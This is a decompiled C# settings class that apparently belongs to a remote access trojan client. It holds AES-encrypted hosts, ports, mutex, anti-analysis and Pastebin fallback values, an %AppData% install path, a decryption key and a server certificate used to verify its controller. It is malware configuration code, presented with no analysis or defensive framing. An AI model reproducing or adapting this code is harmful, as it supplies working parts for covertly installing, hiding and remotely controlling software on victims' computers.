using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Client.Algorithm;
using Client.Helper;

namespace Client
{
	// Token: 0x02000003 RID: 3
	public static class Settings
	{
		// Token: 0x06000003 RID: 3 RVA: 0x000026FC File Offset: 0x000008FC
		public static bool InitializeSettings()
		{
			bool flag;
			try
			{
				Settings.Key = Encoding.UTF8.GetString(Convert.FromBase64String(Settings.Key));
				Settings.aes256 = new Aes256(Settings.Key);
				Settings.Ports = Settings.aes256.Decrypt(Settings.Ports);
				Settings.Hosts = Settings.aes256.Decrypt(Settings.Hosts);
				Settings.Version = Settings.aes256.Decrypt(Settings.Version);
				Settings.Install = Settings.aes256.Decrypt(Settings.Install);
				Settings.MTX = Settings.aes256.Decrypt(Settings.MTX);
				Settings.Pastebin = Settings.aes256.Decrypt(Settings.Pastebin);
				Settings.Anti = Settings.aes256.Decrypt(Settings.Anti);
				Settings.BDOS = Settings.aes256.Decrypt(Settings.BDOS);
				Settings.Group = Settings.aes256.Decrypt(Settings.Group);
				Settings.Hwid = HwidGen.HWID();
				Settings.Serversignature = Settings.aes256.Decrypt(Settings.Serversignature);
				Settings.ServerCertificate = new X509Certificate2(Convert.FromBase64String(Settings.aes256.Decrypt(Settings.Certificate)));
				flag = Settings.VerifyHash();
			}
			catch
			{
				flag = false;
			}
			return flag;
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002854 File Offset: 0x00000A54
		private static bool VerifyHash()
		{
			bool flag;
			try
			{
				flag = ((RSACryptoServiceProvider)Settings.ServerCertificate.PublicKey.Key).VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(Settings.Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Settings.Serversignature));
			}
			catch (Exception)
			{
				flag = false;
			}
			return flag;
		}

		// Token: 0x04000001 RID: 1
		public static string Ports = "FteGGwSLveH/e9FFy9a4hfthYL9yV6WWWcYrI3NVKrOc8ZgvgE4YG2FWFAEvqATUBijm4StdauKxoiYVc2rJDQ==";

		// Token: 0x04000002 RID: 2
		public static string Hosts = "s5Ad/FjDPQHBgg05E9FnSYCvAJibVcQ7/YxO8/TOILD//ixZBxK6nFBLsM3oe/ZqDXYC8tSIJeRsH0Zg+5YABg==";

		// Token: 0x04000003 RID: 3
		public static string Version = "hRmalUjNhS9CKKHapccElWvCE+4ImRql+B6dAyl818iSohxlmKbz0RdhDpywtGPBhZlC/zI5zK1XIzJcpy29mw==";

		// Token: 0x04000004 RID: 4
		public static string Install = "lkMkqwAuko9v8m+XUZrIQnmF4sZT5TMlx//IG30N3dAffFxCcWSwgXKSQv0pL23w9lvmCF98mzVTrSrj5CJzlA==";

		// Token: 0x04000005 RID: 5
		public static string InstallFolder = "%AppData%";

		// Token: 0x04000006 RID: 6
		public static string InstallFile = "";

		// Token: 0x04000007 RID: 7
		public static string Key = "Q29qUklKdHA4SEJvZzczU0VzMDJHaU85MTZHeFFnU0o=";

		// Token: 0x04000008 RID: 8
		public static string MTX = "4VBgINH8aV3QLAJtZP5i1qiK3BM8a3USi9qBZ7XtAuXXiB0XfQlCjCcj+QZU41SjZE5zTY7vbMASNBcG8KzcYsTDfw1f2eM7XCPRBzW5sec=";

		// Token: 0x04000009 RID: 9
		public static string Certificate = "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";

		// Token: 0x0400000A RID: 10
		public static string Serversignature = "vku4xOPLn+QgabPL8nz5btue1HxWI9bXiXNVkRSYF77E33pyxoXidBv5yqXya1QtqW3aq+HtNnvkcNoTGIVTrYhZi43bVyqIv9sdcfYcWlpFCVQV0wk73GU0o+dDwWGOMpqXKXcf09T4PNgpkv0cccfwOUjJC5GRkgvWcjevabzalzUwgduegO8rKsf60EFj7ctqXflxLIbZlBflZHyRUaLHGH8nMloq9SZVtpScp4R0fX52mZLLkaz6Lr+Lhw2Dwe4VveDUVdx8bxMHVMUPC2TL9BXwwuZ4nPlN56lA8zHMSSTTK4r8UlmvZqPW+f4qOnPfmjiUuPervinB5hzPhD9e5ay+EbyzAZoOSKHyJe3ymt6YkCDJraeRJMyPvcBwRlxoxx+dMuo60XSL0eWo7DWWfOO8bxkIz1fLwaOy6pqD6cEXRqqLD8CZEBL9M96bQTFdJNSfyjXTS0BSWOpeqQmw9Ji3zPq+NhBeOv81FE7PaoBb1GC7SUesgbEsOUlsgzkR9xNM3opcsJaqlWa/XerQ1ZZh0rQMJ2L+mu3OEBXGImJj3A0tfykZOExSQmKItBCe3VyTMkZ6UolEgHb+BGk6RpwHHApgrHm0VJn2h3nLHIhzW949BH8b/qsKGAXtwYdbx1IJQwCEGKAJKnRcWNECnSYovhrtF+KmXlPp4r9ayMT8Iw/qeS2YmU3XdUL7bSf4krk1XHaadk3S8jbHfbtrOb3orUekEnhO61U5u+fl/nLt2R82pUR3HI0e00PuYndPsviSK49j9NhJjiYVwmjbXBPdujeUudrB/XoUy03JxBmLXYeli/kXivf+i3Hb87hmt+UzqV/yWc6ezULReRtaD9L0jXCLSpKo/CnyDSj/yL1HlYU4GVbHySqreNEjfBIXSkFqKcZFqM3HS5nRTszznLsndZjOkLN8ZyLa4Z1RUn2mloNCLlhXWLRQEn4y/FBnm5Bw/uNIj84j3SzKvw==";

		// Token: 0x0400000B RID: 11
		public static X509Certificate2 ServerCertificate;

		// Token: 0x0400000C RID: 12
		public static string Anti = "6ZB2EFN0XqskWY6MZLXfGFoQjrn/0KUQs8ik+ohB/N383OkRYnCpMZRnVyKZzhQIZXPUxC4nBU607Mx7QdZQZQ==";

		// Token: 0x0400000D RID: 13
		public static Aes256 aes256;

		// Token: 0x0400000E RID: 14
		public static string Pastebin = "/KX7KFIPCQ+lvOXzRFwKJzgJOHetSR/4v3tlk1vzqt9zqM6qlIFVMiIZQPr1sJe8pwqo4mRrm9ZQYTHotDf2ig==";

		// Token: 0x0400000F RID: 15
		public static string BDOS = "iFJE0ixj2k5GU61a/GG6mYKbbP8PgzuQt6R5gAkPvUQWKmEKJxcpXpOYQvrqqOVYgXic2+iegqgJOwwGFQyhcQ==";

		// Token: 0x04000010 RID: 16
		public static string Hwid = null;

		// Token: 0x04000011 RID: 17
		public static string Delay = "3";

		// Token: 0x04000012 RID: 18
		public static string Group = "0ZbIWGTZWWkSVfVCcge8sIxfwRl5Pabs7QA6JU/ko4nqkJgB0yZbwp5LS4T+z7dxEeGG1gvs7bf5xgmxMWVAEw==";
	}
}
